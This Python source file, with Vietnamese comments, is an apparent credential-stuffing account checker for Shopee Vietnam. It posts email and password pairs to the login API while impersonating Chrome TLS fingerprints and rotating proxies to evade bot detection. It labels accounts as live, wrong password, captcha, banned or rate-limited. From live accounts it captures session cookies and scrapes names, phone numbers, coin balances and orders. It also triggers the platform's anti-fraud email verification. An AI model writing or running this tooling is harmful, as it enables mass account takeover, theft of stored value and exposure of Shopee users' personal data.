import time
from dataclasses import dataclass, field
from typing import Dict, Optional, Any
from curl_cffi import requests as cffi_requests
from checker_engine.config import SHOPEE_LOGIN_URL, AccountStatus
from checker_engine.hasher import hash_shopee_password
from checker_engine.logger import get_logger

logger = get_logger()

@dataclass
class CheckResult:
    email: str
    username: str
    status: AccountStatus
    error_code: int = -1
    error_msg: str = ""
    ivs_flow_no: Optional[str] = None
    ivs_token: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    response_raw: Optional[Dict[str, Any]] = None
    elapsed_ms: int = 0
    used_header_idx: int = -1
    used_proxy: Optional[str] = None
    # Các thông tin tài khoản chi tiết sau khi LIVE
    shopid: Optional[int] = None
    display_name: Optional[str] = None
    phone_masked: Optional[str] = None
    xu_balance: int = 0
    account_level: int = 0
    is_seller: bool = False
    account_created_at: Optional[int] = None

def get_account_info_sync(
    email: str,
    cookies: Dict[str, str],
    headers: Dict[str, str],
    proxy: Optional[str] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    Gọi API lấy thông tin cơ bản và số dư Shopee Xu sau khi có Cookie session LIVE.
    Endpoint: https://shopee.vn/api/v4/account/basic
    """
    csrf = cookies.get("csrftoken", headers.get("x-csrftoken", ""))
    req_headers = dict(headers)
    req_headers.update({
        "x-csrftoken": csrf,
        "x-api-source": "pc",
        "referer": "https://shopee.vn/user/account/profile"
    })
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        resp = cffi_requests.get(
            "https://shopee.vn/api/v4/account/basic",
            headers=req_headers,
            cookies=cookies,
            proxies=proxies,
            impersonate="chrome120",
            timeout=timeout
        )
        if resp.status_code == 200:
            res_json = resp.json()
            data = res_json.get("data", {}) or {}
            info = {
                "shopid": data.get("shopid"),
                "display_name": data.get("name") or data.get("username") or "",
                "phone_masked": data.get("phone", ""),
                "xu_balance": data.get("point", 0) or 0,
                "account_level": data.get("level", 0) or 0,
                "is_seller": data.get("is_seller", False) or False,
                "account_created_at": data.get("ctime")
            }
            logger.info(f"[{email}] 🪙 Xu: {info['xu_balance']} | Tên: {info['display_name']} | SĐT: {info['phone_masked']}")
            return info
    except Exception as e:
        logger.warning(f"[{email}] Không thể lấy thông tin chi tiết Shopee: {e}")
    return {}



def get_user_coins_summary_sync(

    email: str,
    cookies: Dict[str, str],
    headers: Dict[str, str],
    proxy: Optional[str] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    [LUỒNG ĐỘC LẬP] Gọi API lấy chi tiết Số dư Shopee Xu và Xu sắp hết hạn.
    Endpoint: GET https://shopee.vn/api/v4/coin/get_user_coins_summary
    """
    csrf = cookies.get("csrftoken", headers.get("x-csrftoken", ""))
    req_headers = dict(headers)
    req_headers.update({
        "x-csrftoken": csrf,
        "x-api-source": "pc",
        "referer": "https://shopee.vn/user/coin",
        "x-shopee-language": "vi",
        "x-sz-sdk-version": "1.12.40"
    })
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        resp = cffi_requests.get(
            "https://shopee.vn/api/v4/coin/get_user_coins_summary",
            headers=req_headers,
            cookies=cookies,
            proxies=proxies,
            impersonate="chrome120",
            timeout=timeout
        )
        if resp.status_code == 200:
            res_json = resp.json()
            data = res_json.get("data", {}) or {}
            coin_info = {
                "user_coins": data.get("user_coins", 0) or 0,
                "expiring_coins": data.get("expiring_coins", 0) or 0,
                "expiring_date": data.get("expiring_date", 0) or 0,
            }
            logger.info(f"[{email}] 🪙 Chi Tiết Xu: {coin_info['user_coins']} Xu | Sắp hết hạn: {coin_info['expiring_coins']} Xu")
            return coin_info
    except Exception as e:
        logger.warning(f"[{email}] Không thể lấy tóm tắt Shopee Xu: {e}")

    return {}


def get_order_checkout_list_sync(
    email: str,
    cookies: Dict[str, str],
    headers: Dict[str, str],
    proxy: Optional[str] = None,
    limit: int = 5,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    [LUỒNG ĐỘC LẬP] Gọi API lấy danh sách đơn mua hàng / tình trạng đơn.
    Endpoint: GET https://shopee.vn/api/v4/order/get_checkout_list?_oft=2048&limit=5
    """
    csrf = cookies.get("csrftoken", headers.get("x-csrftoken", ""))
    req_headers = dict(headers)
    req_headers.update({
        "x-csrftoken": csrf,
        "x-api-source": "pc",
        "referer": "https://shopee.vn/user/purchase/list/?type=9",
        "x-shopee-language": "vi",
        "x-sz-sdk-version": "1.12.40"
    })
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        url = f"https://shopee.vn/api/v4/order/get_checkout_list?_oft=2048&limit={limit}"
        resp = cffi_requests.get(
            url,
            headers=req_headers,
            cookies=cookies,
            proxies=proxies,
            impersonate="chrome120",
            timeout=timeout
        )
        if resp.status_code == 200:
            res_json = resp.json()
            data = res_json.get("data", {}) or {}
            orders = data.get("orders", []) or []
            order_info = {
                "total_orders": data.get("total_count", len(orders)),
                "recent_orders_count": len(orders),
                "orders_sample": [
                    {
                        "order_id": o.get("order_id"),
                        "status": o.get("status"),
                        "status_description": o.get("status_description", "")
                    }
                    for o in orders[:limit]
                ]
            }
            logger.info(f"[{email}] 📦 Đơn Hàng: Tổng {order_info['total_orders']} đơn | {order_info['recent_orders_count']} đơn gần nhất")
            return order_info
    except Exception as e:
        logger.warning(f"[{email}] Không thể lấy danh sách đơn hàng Shopee: {e}")

    return {}



def check_account_sync(
    email: str,
    password_plain: str,
    headers: Dict[str, str],
    cookies: Dict[str, str],
    security_device_fingerprint: str = "",
    proxy: Optional[str] = None,
    username: str = "",
    header_idx: int = -1,
    timeout: int = 25
) -> CheckResult:
    """
    Thực hiện call API Shopee login_by_password bằng curl_cffi:
    Bypass TLS/JA3 fingerprint.
    """
    hashed_pass = hash_shopee_password(password_plain)
    fingerprint = security_device_fingerprint or headers.get("af-ac-enc-sz-token", "")

    payload = {
        "email": email.strip(),
        "password": hashed_pass,
        "support_ivs": True,
        "stay_logged_in": True,
        "client_identifier": {
            "security_device_fingerprint": fingerprint
        }
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None
    start_time = time.time()

    try:
        resp = cffi_requests.post(
            SHOPEE_LOGIN_URL,
            json=payload,
            headers=headers,
            cookies=cookies,
            proxies=proxies,
            impersonate="chrome120",
            timeout=timeout
        )
        elapsed_ms = int((time.time() - start_time) * 1000)

        # Kiểm tra HTTP Status
        if resp.status_code == 429:
            logger.warning(f"[{email}] Dính Rate Limit HTTP 429 ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.RATE_LIMIT,
                error_code=429,
                error_msg="Rate Limit 429",
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        data = resp.json()
        error_code = data.get("error", -1)
        error_msg = data.get("error_msg", "")
        res_data = data.get("data")

        # Map Error Code
        if error_code == 0:
            # Login thành công hoàn toàn
            captured_cookies = dict(resp.cookies)
            logger.info(f"[{email}] 🟢 LIVE (Thành công hoàn toàn) ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.LIVE,
                error_code=0,
                error_msg=error_msg,
                cookies=captured_cookies,
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        elif error_code == 98:
            # IVS Email Verification (Đúng pass)
            ivs_flow_no = res_data.get("ivs_flow_no") if res_data else None
            ivs_token = res_data.get("ivs_token") if res_data else None
            captured_cookies = dict(resp.cookies)
            logger.info(f"[{email}] 🟡 LIVE / IVS_VERIFY (Đúng Pass - Cần xác minh Email) ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.IVS_VERIFY,
                error_code=98,
                error_msg="IVS Verification Required",
                ivs_flow_no=ivs_flow_no,
                ivs_token=ivs_token,
                cookies=captured_cookies,
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        elif error_code == 2:
            # Sai tài khoản hoặc mật khẩu
            logger.info(f"[{email}] 🔴 WRONG_PASS / DIE (Sai User/Pass) ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.WRONG_PASS,
                error_code=2,
                error_msg="Sai Tên tài khoản hoặc Mật khẩu",
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        elif error_code == 89:
            # Dính Captcha
            logger.warning(f"[{email}] 🧩 CAPTCHA Required ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.CAPTCHA,
                error_code=89,
                error_msg="Captcha Puzzle Required",
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        elif error_code == 9 or "f02" in str(error_msg).lower():
            # Tài khoản bị khóa vi phạm chính sách (F02/Banned)
            logger.info(f"[{email}] 🚫 BANNED / FROZEN (Mã lỗi F02/error 9) ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.BANNED,
                error_code=error_code,
                error_msg=error_msg or "Tài khoản bị khóa (F02)",
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        elif error_code == 1:
            # Đăng nhập không thành công / IP block / Header block
            logger.warning(f"[{email}] ⚠️ FAILED / BLOCKED (error 1) ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.FAILED,
                error_code=1,
                error_msg="Đăng nhập không thành công (Header/IP block)",
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

        else:
            # Các lỗi khác
            logger.warning(f"[{email}] ❓ Unknown Error {error_code}: {error_msg} ({elapsed_ms}ms)")
            return CheckResult(
                email=email,
                username=username,
                status=AccountStatus.FAILED,
                error_code=error_code,
                error_msg=error_msg or f"Error {error_code}",
                response_raw=data,
                elapsed_ms=elapsed_ms,
                used_header_idx=header_idx,
                used_proxy=proxy
            )

    except Exception as e:
        elapsed_ms = int((time.time() - start_time) * 1000)
        logger.error(f"[{email}] 💥 Exception khi gọi Shopee API: {e}")
        return CheckResult(
            email=email,
            username=username,
            status=AccountStatus.TIMEOUT if "timeout" in str(e).lower() else AccountStatus.FAILED,
            error_code=-1,
            error_msg=str(e),
            elapsed_ms=elapsed_ms,
            used_header_idx=header_idx,
            used_proxy=proxy
        )


def send_email_verify_request_sync(
    v_token: str,
    request_id: str,
    cookies: Dict[str, str],
    headers: Dict[str, str],
    security_device_fingerprint: str = "",
    proxy: Optional[str] = None,
    timeout: int = 15
) -> Dict[str, Any]:
    """
    Gửi request kích hoạt Shopee bắn email xác minh (dlink) về hộp thư Outlook:
    POST https://shopee.vn/api/v4/anti_fraud/ivs/link/email_verify
    """
    url = "https://shopee.vn/api/v4/anti_fraud/ivs/link/email_verify"
    csrf = cookies.get("csrftoken", headers.get("x-csrftoken", ""))
    fingerprint = security_device_fingerprint or headers.get("af-ac-enc-sz-token", "")

    req_headers = dict(headers)
    req_headers.update({
        "content-type": "application/json",
        "accept": "application/json",
        "origin": "https://shopee.vn",
        "referer": "https://shopee.vn/verify/email-link",
        "x-api-source": "pc",
        "x-csrftoken": csrf,
        "x-shopee-language": "vi",
        "x-sz-sdk-version": "1.12.40"
    })
    if fingerprint:
        req_headers["af-ac-enc-sz-token"] = fingerprint

    payload = {
        "v_token": v_token,
        "request_id": request_id,
        "new_sender_meta": {
            "security_device_fingerprint": fingerprint
        }
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = cffi_requests.post(
            url,
            json=payload,
            headers=req_headers,
            cookies=cookies,
            proxies=proxies,
            impersonate="chrome120",
            timeout=timeout
        )
        if resp.status_code == 200:
            data = resp.json()
            logger.info(f"✅ [Shopee Anti-Fraud] Đã gửi yêu cầu bắn email xác minh thành công! Response: {data}")
            return {"success": True, "data": data, "cookies": dict(resp.cookies)}
        else:
            logger.warning(f"⚠️ [Shopee Anti-Fraud] HTTP {resp.status_code}: {resp.text[:200]}")
            return {"success": False, "status_code": resp.status_code, "error": resp.text[:200]}
    except Exception as e:
        logger.error(f"❌ [Shopee Anti-Fraud] Lỗi gửi email verify: {e}")
        return {"success": False, "error": str(e)}

